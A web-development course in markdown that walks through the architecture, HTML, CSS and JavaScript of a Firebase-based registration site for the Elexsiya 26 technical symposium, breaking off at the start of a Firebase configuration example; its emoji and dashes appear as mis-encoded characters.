# âš¡ ELEXSIYA 26 â€” World-Class Web Development Course
### *From Zero to Production: Building a Full-Stack Symposium Platform*

---

> **About This Course**
> This course teaches you to build a production-grade, full-stack web application â€” exactly like the Elexsiya 26 National Level Technical Symposium platform. It is **50% Architecture** (understanding WHY decisions are made) and **50% Tutorial** (hands-on, step-by-step building). By the end, you will be able to design, build, secure, and deploy a world-class website on your own.
>
> **Prerequisite:** Basic knowledge of HTML, CSS, and JavaScript. No framework experience required.

---

## ðŸ“‹ TABLE OF CONTENTS

| # | Module | Style |
|---|--------|-------|
| 1 | Project Architecture & System Design | ðŸ›ï¸ Architecture |
| 2 | Modern HTML: Semantic Structure & SEO | ðŸ“– Tutorial |
| 3 | World-Class CSS: Design Systems & Animation | ðŸ“– Tutorial |
| 4 | JavaScript Architecture: Async, Modules & Patterns | ðŸ›ï¸ Architecture |
| 5 | Firebase Backend: Database, Storage & Functions | ðŸ“– Tutorial |
| 6 | Cybersecurity: Hashing, Rules & Attack Prevention | ðŸ›ï¸ Architecture + Tutorial |
| 7 | Registration & Payment Flow (End-to-End) | ðŸ“– Tutorial |
| 8 | Admin Dashboard Architecture | ðŸ›ï¸ Architecture |
| 9 | QR Codes, Certificates & Email Automation | ðŸ“– Tutorial |
| 10 | Service Workers & PWA | ðŸ›ï¸ Architecture + Tutorial |
| 11 | Deployment, Hosting & CI/CD | ðŸ“– Tutorial |
| 12 | From Zero: Build Your Own World-Class Site | ðŸ“– Tutorial |

---

# MODULE 1: PROJECT ARCHITECTURE & SYSTEM DESIGN
## *The Blueprint Before the Bricks*

---

### 1.1 What We Are Building

Elexsiya 26 is a **National-Level Technical Symposium Web Platform**. It is not just a static website â€” it is a full-stack application handling:

- Online event registration with payment
- Multi-role admin dashboards (Super Admin, Treasurer, On-Spot, Event Admins)
- Real-time QR-based attendance management
- Automated certificate generation and email delivery
- Sponsor management and financial tracking

This is production software used by **200+ real participants and 50+ colleges**. Every design decision matters.

---

### 1.2 Why "Serverless"? â€” The Architecture Decision

Most beginners think of web apps as: **Frontend (Browser) â†’ Backend Server â†’ Database**. This is the traditional architecture (LAMP, Django, Node+Express).

Elexsiya 26 uses a **Serverless Architecture**:

```
Browser (Vanilla JS + HTML/CSS)
       â†•
Firebase SDK (runs IN the browser)
       â†•
Google Firebase Cloud (Firestore DB, Storage, Cloud Functions, Hosting)
       â†•
EmailJS (Serverless Email API)
```

**Why Serverless for a Symposium?**

| Traditional Server | Serverless (Firebase) |
|---|---|
| You manage the server 24/7 | Google manages it |
| Costs money even when idle | Pay only for use (Free tier is huge) |
| Requires DevOps knowledge | Deploy with one command |
| Scales manually | Auto-scales on event day traffic spikes |
| You write auth logic | Firebase Auth built-in |

**The key insight:** For a one-day event with unpredictable traffic spikes, serverless is the perfect choice.

---

### 1.3 The Full System Map

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                        BROWSER CLIENT                           â”‚
â”‚                                                                 â”‚
â”‚  index.html    â†’ Landing Page, Events, FAQ                      â”‚
â”‚  events.html   â†’ Event Listing + Registration Form              â”‚
â”‚  register.html â†’ Multi-step Registration Flow                   â”‚
â”‚  payment.html  â†’ Payment Screenshot Upload                      â”‚
â”‚  success.html  â†’ Confirmation Page + QR Code                    â”‚
â”‚  login.html    â†’ Participant Portal Login                       â”‚
â”‚  certificate.html â†’ Certificate Download Portal                 â”‚
â”‚                                                                 â”‚
â”‚  admin.html         â†’ Admin Login Gate                          â”‚
â”‚  dashboard.html     â†’ Main Admin Dashboard                      â”‚
â”‚  chess_admin.html   â†’ Chess Event Admin                         â”‚
â”‚  ideaforge_admin.html â†’ IdeaForge Event Admin                   â”‚
â”‚  onspot_dashboard.html â†’ On-Spot Registration & Attendance      â”‚
â”‚                                                                 â”‚
â”‚  shared.js      â†’ Universal utilities, Firestore helpers        â”‚
â”‚  firebase-config.js â†’ Firebase initialization                   â”‚
â”‚  sw.js          â†’ Service Worker (PWA caching)                  â”‚
â”‚  styles.css     â†’ Global design system                          â”‚
â”‚  landing.css    â†’ Landing-page specific styles                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                             â”‚ Firebase SDK (CDN)
                             â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    FIREBASE CLOUD                               â”‚
â”‚                                                                 â”‚
â”‚  Firestore (NoSQL DB)                                           â”‚
â”‚  â”œâ”€â”€ /registrations/{regId}  â†’ All participant data            â”‚
â”‚  â”œâ”€â”€ /screenshots/{regId}    â†’ Payment proof images            â”‚
â”‚  â”œâ”€â”€ /settings/certificate   â†’ Certificate template            â”‚
â”‚  â”œâ”€â”€ /sponsorships/{id}      â†’ Sponsor records                 â”‚
â”‚  â”œâ”€â”€ /expenditures/{id}      â†’ Expense records                 â”‚
â”‚  â”œâ”€â”€ /site_logs/{id}         â†’ Activity logs                   â”‚
â”‚  â”œâ”€â”€ /feedback/{id}          â†’ Participant feedback            â”‚
â”‚  â””â”€â”€ /admin_audit/{id}       â†’ Append-only audit log          â”‚
â”‚                                                                 â”‚
â”‚  Firebase Storage                                               â”‚
â”‚  â”œâ”€â”€ /payment_screenshots/   â†’ Payment proof files             â”‚
â”‚  â””â”€â”€ /certificates/          â†’ Generated certificate images    â”‚
â”‚                                                                 â”‚
â”‚  Cloud Functions (Node.js)                                      â”‚
â”‚  â”œâ”€â”€ adminTogglePayment      â†’ Secure payment status update    â”‚
â”‚  â””â”€â”€ adminDeleteRegistration â†’ Secure registration deletion    â”‚
â”‚                                                                 â”‚
â”‚  Firebase Hosting                                               â”‚
â”‚  â””â”€â”€ Public URL (elexsiya26.web.app)                           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                             â†•
              EmailJS API (Automated Emails)
```

---

### 1.4 Data Flow: A Registration in Action

Understanding ONE complete user journey gives you the mental model for the entire codebase.

```
1. User visits events.html
        â†“
2. Selects events â†’ Front-end validates time conflicts
        â†“
3. Fills registration form â†’ generateRegId() creates "ELX-XXXXXXXX"
        â†“
4. addRegistration() is called:
   - Checks closed events from Firestore
   - Checks time conflicts
   - Calculates checksum (tamper-detection)
   - Writes to Firestore: /registrations/ELX-XXXXXXXX
   - Clears local cache (_registrationsCache = null)
        â†“
5. User redirected to payment.html
   - Session data (regId, name, email) carried via sessionStorage
        â†“
6. User uploads payment screenshot â†’ uploadPaymentScreenshot():
   - Compresses image to JPEG thumbnail via Canvas API
   - Uploads full image to Firebase Storage
   - Saves document in /screenshots/ Firestore collection
   - Updates paymentStatus â†’ "Verification Required"
        â†“
7. sendAutomatedEmail() â†’ EmailJS sends confirmation email
        â†“
8. User lands on success.html:
   - QR code generated from regId
   - Participant can download it
        â†“
9. Admin dashboard shows "Verification Required" tag
   - Admin reviews screenshot and marks "Paid"
        â†“
10. Admin releases certificate â†’ participant downloads it
```

---

### 1.5 Architecture Principle: "Defense in Depth"

The project implements **layered security** â€” if one layer fails, the next one catches it.

```
Layer 1: Client-Side Validation (UX, not security)
        â†“ (can be bypassed by a hacker)
Layer 2: Firestore Security Rules (blocks malicious writes)
        â†“ (rules have trade-offs due to Spark plan limits)
Layer 3: Cloud Functions (server-side, fully trusted)
        â†“
Layer 4: SHA-256 Admin Token Verification (on every sensitive action)
        â†“
Layer 5: Append-only Audit Log (tamper-proof history)
```

We will explore each layer in detail in Module 6.

---

# MODULE 2: MODERN HTML â€” SEMANTIC STRUCTURE & SEO
## *Building the Skeleton of a World-Class Page*

---

### 2.1 Why Semantic HTML Matters

Most beginners write HTML like this:

```html
<!-- âŒ BAD: Div soup â€” a search engine and screen reader sees nothing -->
<div class="top">
  <div class="logo">Elexsiya</div>
  <div class="menu">
    <div>About</div>
    <div>Events</div>
  </div>
</div>

<div class="big-text">National Level Technical Symposium</div>
<div class="paragraph">Innovate. Inspire. Ignite.</div>
```

A world-class website uses **semantic HTML** â€” tags that describe their meaning:

```html
<!-- âœ… GOOD: Semantic HTML from index.html -->
<nav class="navbar" id="mainNav">
  <div class="container">
    <a href="#" class="logo">
      <img src="logo.jpg" alt="Elexsiya 26" class="logo-img" 
           fetchpriority="high" loading="eager" />
      <span class="logo-text">Elexsiya</span>
    </a>
    <ul class="nav-links" id="navLinks">
      <li><a href="#about">About</a></li>
      <li><a href="#events">Events</a></li>
      <li><a href="#prizes">Prizes</a></li>
      <li><a href="#contact">Contact</a></li>
    </ul>
  </div>
</nav>

<header class="hero" id="hero">
  <h1 class="hero-title">Elexsiya 26</h1>
  <p class="hero-subtitle">Innovate Â· Inspire Â· Ignite</p>
</header>
```

**Key semantic tags used in this project:**

| Tag | Used For | Why |
|-----|----------|-----|
| `<nav>` | Navigation bar | Screen readers announce "navigation landmark" |
| `<header>` | Hero section | Marks the page's introductory content |
| `<section>` | About, Events, Prizes | Distinct thematic content blocks |
| `<article>` | Event cards | Self-contained, independently meaningful content |
| `<footer>` | Footer | Contact info, legal links |
| `<main>` | Main content | Skip-to-content for accessibility |
| `<h1>`â€“`<h6>` | Headings | Only ONE `<h1>` per page (SEO rule) |

---

### 2.2 Tutorial: The Perfect `<head>` Tag

The `<head>` section is invisible but critical. Here's the optimized version from `index.html`:

```html
<head>
  <!-- 1. CACHE BUSTER: Forces fresh load when version changes -->
  <script>
    (function() {
      const currentVersion = 'v1.1';
      const storedVersion = localStorage.getItem('app_version');
      if (storedVersion !== currentVersion) {
        localStorage.clear();
        sessionStorage.clear();
        localStorage.setItem('app_version', currentVersion);
        // Clear all Service Worker caches
        if ('caches' in window) {
          caches.keys().then(names => {
            for (let name of names) caches.delete(name);
          });
        }
        window.location.reload(true);
      }
    })();
  </script>

  <!-- 2. CHARSET & VIEWPORT: The two most critical meta tags -->
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no" />

  <!-- 3. SEO META TAGS -->
  <title>Elexsiya 26 â€“ National Level Technical Symposium</title>
  <meta name="description" content="Elexsiya 26 â€“ National Level Technical Symposium at Anna University Regional Campus Madurai." />

  <!-- 4. SECURITY HEADERS (Content Security Policy) -->
  <meta http-equiv="Content-Security-Policy"
    content="default-src 'self';
             script-src 'self' 'unsafe-inline' https://www.gstatic.com https://cdn.jsdelivr.net;
             style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
             font-src 'self' https://fonts.gstatic.com;
             img-src 'self' data: https://api.qrserver.com;
             connect-src 'self' https://firestore.googleapis.com https://*.firebaseio.com;">

  <!-- 5. CACHE CONTROL HEADERS -->
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">

  <!-- 6. PERFORMANCE: Preconnect to third-party origins -->
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />

  <!-- 7. PRELOAD CRITICAL CSS: Load CSS before render -->
  <link rel="preload" href="styles.css?v=4" as="style" />
  <link rel="preload" href="landing.css?v=4" as="style" />

  <!-- 8. NON-BLOCKING FONTS: Load asynchronously -->
  <link rel="preload" as="style"
    href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700;900&family=Montserrat:wght@400;600;700&display=swap"
    onload="this.onload=null;this.rel='stylesheet'" />
  <noscript>
    <link rel="stylesheet" href="https://fonts.googleapis.com/..." />
  </noscript>

  <!-- 9. STYLESHEETS with cache-busting query strings -->
  <link rel="stylesheet" href="styles.css?v=4" />
  <link rel="stylesheet" href="landing.css?v=4" />
</head>
```

**Architecture Lessons from this `<head>`:**

1. **Cache-busting script runs first** â€” before any CSS loads, preventing stale UI bugs
2. **CSP header** prevents XSS by whitelisting trusted sources only
3. **`preconnect`** tells the browser to establish connections early (saves 100-300ms)
4. **`preload`** tells the browser to download critical CSS files immediately
5. **Font loading trick** â€” the `onload` attribute + `<noscript>` fallback pattern eliminates render-blocking Google Fonts
6. **`?v=4` query strings** on CSS/JS force browsers to load the new file on deploy

---

### 2.3 Tutorial: Building the Hero Section

The hero section is the first thing users see. It must make an impact.

```html
<header class="hero" id="hero">
  <div class="hero-content">
    
    <!-- Eyebrow text â€” descriptive tagline above the title -->
    <span class="hero-eyebrow">National Level Technical Symposium</span>
    
    <!-- THE ONE h1 PER PAGE â€” critical SEO rule -->
    <h1 class="hero-title">Elexsiya 26</h1>
    
    <!-- Subtitle and date -->
    <p class="hero-subtitle">Innovate Â· Inspire Â· Ignite</p>
    <p class="hero-subtitle">
      <strong>MARCH 27, 2026</strong> &nbsp;Â·&nbsp;
      ANNA UNIVERSITY REGIONAL CAMPUS, MADURAI
    </p>

    <!-- Countdown Timer â€” keeps users engaged -->
    <div class="hanim-countdown">
      <div class="hanim-countdown-title">â³ Event Begins In</div>
      <div class="hanim-countdown-grid" id="hcGrid">
        <div class="hanim-cd-unit">
          <span class="hanim-cd-num" id="hcDays">00</span>
          <span class="hanim-cd-lbl">Days</span>
        </div>
        <!-- ... Hours, Mins, Secs ... -->
      </div>
    </div>

    <!-- Call-to-Action Buttons -->
    <div class="hero-actions">
      <a href="events.html" class="btn btn-red btn-lg" id="registerBtn">
        ðŸŽ¯ Register Now
      </a>
      <a href="#events" class="btn btn-outline-white btn-lg">
        Explore Events
      </a>
      <a href="brochure.pdf" class="btn btn-outline-white btn-lg" download>
        ðŸ“„ Download Brochure
      </a>
    </div>

  </div>

  <!-- Scroll indicator â€” a subtle UX signal to keep scrolling -->
  <div class="scroll-indicator">
    <span>Scroll Down</span>
    <div class="scroll-arrow"></div>
  </div>
</header>
```

---

### 2.4 Tutorial: Live Countdown Timer (JavaScript)

```javascript
// Run countdown in the hero section
function startCountdown() {
  // Target date: March 27, 2026, 09:00:00 IST
  const eventDate = new Date('2026-03-27T09:00:00+05:30').getTime();

  function update() {
    const now = Date.now();
    const diff = eventDate - now;

    if (diff <= 0) {
      // Event has started â€” show "LIVE" instead
      document.getElementById('hcGrid').innerHTML = 
        '<span style="color:#ff4444;font-size:2rem;font-weight:900;">ðŸ”´ LIVE NOW!</span>';
      return;
    }

    // Convert milliseconds to time units
    const days    = Math.floor(diff / (1000 * 60 * 60 * 24));
    const hours   = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((diff % (1000 * 60)) / 1000);

    // Pad with leading zeros (e.g., 5 â†’ "05")
    const pad = n => String(n).padStart(2, '0');

    document.getElementById('hcDays').textContent  = pad(days);
    document.getElementById('hcHours').textContent = pad(hours);
    document.getElementById('hcMins').textContent  = pad(minutes);
    document.getElementById('hcSecs').textContent  = pad(seconds);
  }

  update();
  setInterval(update, 1000); // Update every second
}

// Only start when DOM is ready
document.addEventListener('DOMContentLoaded', startCountdown);
```

---

# MODULE 3: WORLD-CLASS CSS â€” DESIGN SYSTEMS & ANIMATION
## *Making Users Say "WOW"*

---

### 3.1 The Design System Approach

Amateur developers write CSS property by property:

```css
/* âŒ AMATEUR: Hard-coded values everywhere */
.hero { background: #cc0000; }
.button { background: #cc0000; border-radius: 8px; }
.card { border: 1px solid #e0e0e0; border-radius: 8px; }
```

If the brand color changes, you must find and replace hundreds of values. 

World-class developers build a **design system** using CSS Custom Properties (variables):

```css
/* âœ… PROFESSIONAL: Centralized Design Tokens from styles.css */
:root {
  /* â”€â”€ Brand Colors â”€â”€ */
  --emirates-red:   #cc0000;       /* Primary brand color */
  --primary:        #cc0000;
  --gold-shimmer:   #d4af37;       /* Accent / highlight color */
  --gold-dark:      #b8860b;
  
  /* â”€â”€ Backgrounds â”€â”€ */
  --bg-dark:        #0a0a0a;       /* True dark background */
  --bg-card:        #111111;       /* Card background */
  --bg-light:       #f8f9fa;       /* Light section background */
  
  /* â”€â”€ Typography â”€â”€ */
  --text-dark:      #1a1a1a;
  --text-muted:     #666666;
  --text-on-dark:   #ffffff;
  
  /* â”€â”€ Layout â”€â”€ */
  --border-radius:  12px;
  --border-light:   #e0e0e0;
  --container-max:  1200px;
  
  /* â”€â”€ Shadows â”€â”€ */
  --shadow-sm:  0 2px 8px rgba(0,0,0,0.08);
  --shadow-md:  0 8px 32px rgba(0,0,0,0.12);
  --shadow-lg:  0 20px 60px rgba(0,0,0,0.2);
  
  /* â”€â”€ Transitions â”€â”€ */
  --transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
```

Now every component references these tokens:

```css
.btn-red {
  background: var(--emirates-red);
  border-radius: var(--border-radius);
  transition: all var(--transition);
}
```

Change `--emirates-red` in one place â†’ entire website updates instantly.

---

### 3.2 Tutorial: The Modern Button System

```css
/* Base button â€” shared styles for ALL buttons */
.btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  padding: 12px 28px;
  border-radius: 50px;          /* Pill shape */
  font-family: 'Montserrat', sans-serif;
  font-weight: 700;
  font-size: 0.9rem;
  letter-spacing: 0.5px;
  text-decoration: none;
  border: 2px solid transparent;
  cursor: pointer;
  transition: all var(--transition);
  position: relative;
  overflow: hidden;             /* Clip the ripple effect */
}

/* Ripple effect on click */
.btn::after {
  content: '';
  position: absolute;
  inset: 0;
  background: rgba(255,255,255,0.1);
  opacity: 0;
  transition: opacity 0.2s;
}
.btn:active::after { opacity: 1; }

/* Primary Red Button */
.btn-red {
  background: linear-gradient(135deg, #cc0000 0%, #990000 100%);
  color: #ffffff;
  box-shadow: 0 4px 20px rgba(204, 0, 0, 0.35);
}
.btn-red:hover {
  transform: translateY(-2px);
  box-shadow: 0 8px 30px rgba(204, 0, 0, 0.5);
}
.btn-red:active { transform: translateY(0); }

/* Outline White Button */
.btn-outline-white {
  background: rgba(255, 255, 255, 0.08);
  color: rgba(255, 255, 255, 0.9);
  border-color: rgba(255, 255, 255, 0.3);
  backdrop-filter: blur(10px);    /* Glassmorphism */
}
.btn-outline-white:hover {
  background: rgba(255, 255, 255, 0.15);
  border-color: rgba(255, 255, 255, 0.6);
  transform: translateY(-2px);
}

/* Size Variants */
.btn-sm  { padding: 8px 18px;  font-size: 0.8rem; }
.btn-lg  { padding: 16px 36px; font-size: 1rem; }
```

---

### 3.3 The Glassmorphism Effect

Glassmorphism is the defining design trend of modern premium UIs. It creates the illusion of frosted glass.

```css
/* Glassmorphism card â€” used across the project */
.glass-card {
  background: rgba(255, 255, 255, 0.08);  /* Semi-transparent white */
  backdrop-filter: blur(20px);             /* The glass blur effect */
  -webkit-backdrop-filter: blur(20px);     /* Safari support */
  border: 1px solid rgba(255, 255, 255, 0.15); /* Subtle border */
  border-radius: 20px;
  box-shadow: 
    0 8px 32px rgba(0, 0, 0, 0.3),         /* Outer shadow */
    inset 0 1px 0 rgba(255,255,255,0.1);   /* Inner highlight */
}
```

**How it works:**
1. `background: rgba(...)` â€” transparent enough to show background through
2. `backdrop-filter: blur(...)` â€” blurs whatever is BEHIND the element (the actual "glass" effect)
3. `border: 1px solid rgba(...)` â€” subtle glassy edge
4. `inset` box-shadow â€” simulates a light source hitting the top edge

---

### 3.4 Tutorial: Scroll-Triggered Animations

The project uses Intersection Observer to animate elements as they scroll into view.

**CSS (the animated state):**
```css
/* Initial state: hidden and slightly below position */
.animate-on-scroll {
  opacity: 0;
  transform: translateY(30px);
  transition: opacity 0.6s ease, transform 0.6s ease;
}

/* When visible: animate to normal state */
.animate-on-scroll.visible {
  opacity: 1;
  transform: translateY(0);
}

/* Staggered delays for grid items */
.animate-on-scroll.delay-1 { transition-delay: 0.1s; }
.animate-on-scroll.delay-2 { transition-delay: 0.2s; }
.animate-on-scroll.delay-3 { transition-delay: 0.3s; }
```

**JavaScript (the trigger):**
```javascript
// Intersection Observer â€” vastly more performant than scroll event listeners
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      entry.target.classList.add('visible');
      // Once visible, stop observing (animation plays once)
      observer.unobserve(entry.target);
    }
  });
}, {
  threshold: 0.1,  // Trigger when 10% of element is visible
  rootMargin: '0px 0px -50px 0px' // Trigger 50px before the element enters viewport
});

// Observe all elements with the animate class
document.querySelectorAll('.animate-on-scroll').forEach(el => {
  observer.observe(el);
});
```

**Why Intersection Observer over `scroll` events?**
- `scroll` events fire hundreds of times per second (very slow)
- `IntersectionObserver` fires only when visibility changes (extremely fast)
- Browser-native, runs off the main thread

---

### 3.5 Mobile-First Responsive Design

```css
/* â”€â”€ MOBILE FIRST: Base styles are for mobile â”€â”€ */
.events-grid {
  display: grid;
  grid-template-columns: 1fr;          /* 1 column on mobile */
  gap: 20px;
}

.hero-title {
  font-size: clamp(2.5rem, 10vw, 6rem); /* Fluid typography */
}

/* â”€â”€ TABLET: 768px and wider â”€â”€ */
@media (min-width: 768px) {
  .events-grid {
    grid-template-columns: repeat(2, 1fr);  /* 2 columns */
  }
}

/* â”€â”€ DESKTOP: 1024px and wider â”€â”€ */
@media (min-width: 1024px) {
  .events-grid {
    grid-template-columns: repeat(3, 1fr);  /* 3 columns */
  }
}
```

**`clamp()` for fluid typography:**
```css
font-size: clamp(MIN, PREFERRED, MAX);
/* e.g., clamp(2rem, 8vw, 5rem) */
/* - Minimum: 2rem (32px) regardless of screen */
/* - Preferred: 8% of viewport width (scales with screen) */
/* - Maximum: 5rem (80px) regardless of screen */
```

---

### 3.6 Tutorial: The Marquee Scroll Strip

The scrolling text strip below the hero creates dynamism.

```css
/* Container clips the overflow */
.marquee-strip {
  overflow: hidden;
  background: var(--emirates-red);
  padding: 12px 0;
  white-space: nowrap;
}

/* The double-width track â€” key to seamless looping */
.marquee-track {
  display: inline-flex;
  gap: 40px;
  animation: marquee 25s linear infinite;
}

/* The animation: slides left by exactly half the width */
/* Because content is duplicated, it loops seamlessly */
@keyframes marquee {
  from { transform: translateX(0); }
  to   { transform: translateX(-50%); }
}

.marquee-track span {
  color: white;
  font-weight: 700;
  font-size: 0.9rem;
  letter-spacing: 1px;
}

.marquee-dot {
  color: rgba(255,255,255,0.5);
}

/* Respect "reduce motion" accessibility preference */
@media (prefers-reduced-motion: reduce) {
  .marquee-track { animation: none; }
}
```

**The seamless loop trick:**
The HTML duplicates all items in `.marquee-track`. When the animation slides the track left by 50%, it has scrolled through exactly one set of items â€” and the duplicate starts perfectly where the original began. The animation resets invisibly.

---

# MODULE 4: JAVASCRIPT ARCHITECTURE
## *Async, Modules & Design Patterns*

---

### 4.1 The Shared Utilities Pattern

The project uses `shared.js` as a **universal utility library** â€” included on every page. This is a foundational architectural pattern.

```
Every HTML page (index.html, events.html, dashboard.html...)
  â†“  loads
shared.js  â† admin hashes, Firestore helpers, email utils, ID generation
  â†“  which uses
firebase-config.js  â† sets up window.db, window.storage, window.auth
```

**Why not ES Modules (import/export)?**

This project targets a Firebase CDN-loaded environment. Using `<script type="module">` would require a build step (Webpack/Vite). The shared global approach trades module isolation for zero build complexity â€” perfect for a static site deployed to Firebase Hosting.

---

### 4.2 Async/Await Deep Dive

All Firebase operations are **asynchronous** (they take time due to network calls). JavaScript handles this with the async/await pattern.

**Bad approach (Callback Hell):**
```javascript
// âŒ Callback hell â€” hard to read, debug, and maintain
firebase.firestore().collection('registrations').get(function(snapshot) {
  snapshot.forEach(function(doc) {
    firebase.firestore().collection('registrations').doc(doc.id).update({
      paymentStatus: 'Paid'
    }, function(err) {
      if (err) {
        console.error(err);
      } else {
        sendEmail(doc.data(), function() {
          console.log('Done!');
        });
      }
    });
  });
});
```

**Good approach (async/await):**
```javascript
// âœ… Clean, readable, maintainable â€” the pattern used in shared.js
async function verifyAndMarkPaid(regId) {
  try {
    // Each 'await' pauses here until the Promise resolves
    const doc = await window.db.collection('registrations').doc(regId).get();
    
    if (!doc.exists) {
      throw new Error(`Registration ${regId} not found.`);
    }

    await window.db.collection('registrations').doc(regId).update({
      paymentStatus: 'Paid'
    });

    await sendAutomatedEmail(EMAILJS_TEMPLATE_VERIFICATION, doc.data());
    
    console.log('âœ… Payment verified and email sent.');
  } catch (err) {
    console.error('âŒ Error:', err.message);
    // Show user-friendly error
    alert('Something went wrong: ' + err.message);
  }
}
```

---

### 4.3 The Cache Pattern

Database calls are expensive (network round-trips). The project implements a **simple in-memory cache** to avoid redundant Firestore reads:

```javascript
// shared.js â€” Cache pattern
let _registrationsCache = null;

async function getRegistrations(forceRefresh = false) {
  // If cache is valid and not forcing a refresh, return it immediately
  if (_registrationsCache && _registrationsCache.length > 0 && !forceRefresh) {
    console.log('[CACHE HIT] Returning cached registrations');
    return _registrationsCache;
  }

  try {
    // Network call â€” only happens on cache miss
    const snapshot = await window.db
      .collection('registrations')
      .orderBy('registeredAt', 'desc')
      .get();

    _registrationsCache = snapshot.docs.map(doc => ({
      id: doc.id,
      ...doc.data()  // Spread operator: merges doc fields into one object
    }));

    return _registrationsCache;
  } catch (err) {
    console.error('[DB] Error:', err);
    return _registrationsCache || []; // Return stale cache if network fails
  }
}

// Invalidate cache after any write operation
async function addRegistration(reg) {
  // ... write to Firestore ...
  _registrationsCache = null; // â† Force next getRegistrations() to fetch fresh data
}
```

**Architecture note:** This is a simplified version of the "stale-while-revalidate" pattern. Production systems use tools like React Query or SWR to do this more robustly.

---

### 4.4 Promise.race() for Timeouts

How do you prevent your app from hanging forever if Firebase is slow? 

```javascript
// shared.js â€” Timeout wrapper pattern
async function getRegistrations() {
  const fetchOp = window.db.collection('registrations')
    .orderBy('registeredAt', 'desc')
    .get();

  // Create a Promise that rejects after 15 seconds
  const fetchTimeout = new Promise((_, reject) =>
    setTimeout(() => reject(new Error('READ_TIMEOUT')), 15000)
  );

  // Race condition: whichever Promise settles first wins
  const snapshot = await Promise.race([fetchOp, fetchTimeout]);
  return snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
}
```

**How `Promise.race()` works:**
- Takes an array of Promises
- Returns a new Promise that resolves/rejects as soon as the FIRST Promise settles
- If Firestore responds in 3s â†’ `fetchOp` wins â†’ you get the data
- If Firestore is stuck â†’ after 15s, `fetchTimeout` wins â†’ error is caught gracefully

---

### 4.5 The Optimistic Write Pattern

This is one of the most sophisticated patterns in the project:

```javascript
async function addRegistration(reg) {
  // ... validation and checksum ...

  // ðŸš€ OPTIMISTIC WRITE: Fire and forget (do NOT await)
  const writeOp = window.db.collection('registrations').doc(reg.regId).set(reg);

  // Handle background errors without blocking the user
  writeOp.catch(err => {
    console.error('[DB] Background sync error:', err);
  });

  // Clear the local cache
  _registrationsCache = null;

  // Return IMMEDIATELY â€” don't wait for the write to complete
  return reg;
}
```

**Why not `await` the write?**

On mobile, browsers **kill network connections** when a user switches apps or their screen locks. When they return, Firebase's WebSocket connection is "zombie" â€” the app thinks it's connected, but it's not. `await`-ing the write in this state causes the app to hang for 60+ seconds.

The solution: Firestore SDK has a built-in **offline queue**. When you call `.set()`, Firestore immediately writes to a local IndexedDB cache and queues the write. It syncs to the server in the background. By not `await`-ing, we use this mechanism intentionally â€” the user proceeds to the payment page instantly, and the data syncs automatically.

---

### 4.6 Unique ID Generation

```javascript
// shared.js â€” generateRegId()
function generateRegId() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let id = 'ELX-'; // Prefix makes IDs identifiable

  try {
    // Use cryptographically secure random number generation
    const randomArray = new Uint32Array(8);
    window.crypto.getRandomValues(randomArray);

    for (let i = 0; i < 8; i++) {
      // Modulo maps the large random number to our character set index
      id += chars[randomArray[i] % chars.length];
    }
  } catch (e) {
    // Fallback: Math.random() for very old/restrictive browsers
    for (let i = 0; i < 8; i++) {
      id += chars.charAt(Math.floor(Math.random() * chars.length));
    }
  }

  return id; // e.g., "ELX-K7MXP3QA"
}
```

**Why `crypto.getRandomValues()` over `Math.random()`?**

`Math.random()` is a **Pseudo-Random Number Generator (PRNG)** â€” it generates numbers from a mathematical formula seeded by the current time. A skilled attacker can predict future values.

`crypto.getRandomValues()` uses the OS's **hardware entropy source** (timing of system interrupts, thermal noise, etc.) â€” truly unpredictable and suitable for security-sensitive IDs.

---

# MODULE 5: FIREBASE BACKEND
## *Database, Storage & Cloud Functions â€” Step by Step*

---

### 5.1 Tutorial: Firebase Project Setup

**Step 1: Create a Firebase Project**
```
1. Go to https://console.firebase.google.com
2. Click "Add Project" â†’ name it (e.g., "my-symposium")
3. Disable Google Analytics (not needed)
4. Click "Create Project"
```

**Step 2: Add a Web App**
```
1. In your project, click the Web icon (</>)
2. Register the app (give it a nickname)
3. Firebase gives you a config object â€” COPY IT:
```

```javascript
const firebaseConfig = {
  apiKey:            "AIzaSy...",
  authDomain:        "my-project.firebaseapp.com",
